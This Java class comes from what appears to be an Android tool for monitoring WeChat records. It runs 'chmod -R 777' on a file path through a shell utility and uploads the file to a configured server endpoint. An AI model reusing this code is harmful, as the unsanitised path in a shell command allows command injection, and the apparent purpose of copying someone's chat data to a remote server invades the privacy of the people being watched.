package com.samego.alic.monitor.wechat.wechatrecord.model;

import com.samego.alic.monitor.wechat.wechatrecord.configure.URI;
import com.samego.alic.monitor.wechat.wechatrecord.utils.DevLog;
import com.samego.alic.monitor.wechat.wechatrecord.utils.OkHttpManager;
import com.samego.alic.monitor.wechat.wechatrecord.utils.ShellUtil;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

public class UploadModel {
    public String uploadFile(String filePath) {
        //表单数据
        HashMap<String, String> mapData = new HashMap<>();
        //表单文件
        File file = new File(filePath);
        ShellUtil.command("chmod -R 777 " + filePath);
        HashMap<String, File> mapFile = new HashMap<>();
        mapFile.put("file", file);
        //重点在这里
        OkHttpManager.postFormAsync(URI.URI_FILE_UPLOAD, mapData, mapFile, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                DevLog.i(e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                DevLog.i(response.body().string());
            }
        });
        return null;
    }
}
